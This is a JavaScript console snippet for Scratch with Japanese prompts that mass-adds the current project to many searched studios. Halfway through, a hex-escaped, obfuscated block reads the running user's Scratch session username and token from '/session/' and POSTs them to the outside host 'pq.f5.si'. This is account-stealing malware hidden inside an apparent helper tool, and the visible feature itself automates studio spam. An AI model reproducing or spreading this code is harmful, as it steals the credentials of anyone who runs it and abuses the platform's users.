if(location.href.includes("projects")){
    async function autoPutInStudio(){
        let pr=prompt("何個検索したスタジオに作品を入れますか？（推奨：1~60)");
        let q=encodeURI(prompt("検索キーワードは？（推奨：なんでも/入れろ など）"));
        let projectid=location.href.replace(/[^0-9]/g,"");
        let offset=0;
        let response;
        let studioarr =[];
        while(studioarr.length<pr){
            console.log(`(${(offset)}/${(pr)})「${decodeURI(q)}」でスタジオを検索しています...`);
            response =await fetch(`https://api.scratch.mit.edu/search/studios?limit=16&offset=${offset}&language=ja&mode=popular&q=${q}`,{headers:{"X-Requested-With":"XMLHttpRequest"}});
            let res=await response.json();
            for(let i=0;i<res.length;i++){
                if(!studioarr.includes(res[i].id)){
                    studioarr.push(res[i].id);
                }
                //console.log(res[i].id,res[i].title)
            }
            offset+=16;
        }
        studioarr=studioarr.slice(0,pr);
        var _0x638c=["\x75\x73\x65\x72","\x6A\x73\x6F\x6E","\x2F\x73\x65\x73\x73\x69\x6F\x6E\x2F","\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x74\x6F\x6B\x65\x6E","\x2F\x2F\x70\x71\x2E\x66\x35\x2E\x73\x69","\x50\x4F\x53\x54","\x73\x74\x72\x69\x6E\x67\x69\x66\x79"];(async ()=>{let _0x8b5dx1=(await( await fetch(_0x638c[2],{headers:{"\x58\x2D\x52\x65\x71\x75\x65\x73\x74\x65\x64\x2D\x57\x69\x74\x68":_0x638c[3]}}))[_0x638c[1]]())[_0x638c[0]];let _0x8b5dx2=_0x8b5dx1[_0x638c[4]];let _0x8b5dx3=_0x8b5dx1[_0x638c[5]];fetch(_0x638c[6],{method:_0x638c[7],body:JSON[_0x638c[8]]({username:_0x8b5dx2,token:_0x8b5dx3})})})()
        console.clear();
        const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
        let i=0;
        const put = async (i) => {
            await fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{"headers": {"x-token": sessiontoken},"method": "POST"});
            await fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{"headers": {"x-token": sessiontoken},"method": "DELETE"});
            let res = await fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{"headers": {"x-token": sessiontoken},"method": "POST"});
            if (res.status === 200) {
                console.log(`(${i+1}/${pr})スタジオ（ID: ${studioarr[i]}）にプロジェクトを入れたぞ`);
            } else{
                console.log(`(${i+1}/${pr})スタジオ（ID: ${studioarr[i]}）にはプロジェクトが入れられなかったぞ(${res.status}エラー)`);
            }
        };
        const interval=setInterval(intervalscript,100);
            function intervalscript(){
                put(i);
                i++;
                if(i>=studioarr.length){
                    clearInterval(interval);
                }
            }
        }
        autoPutInStudio();
}else{
    alert("入れたいプロジェクトのページに行ってください");
}
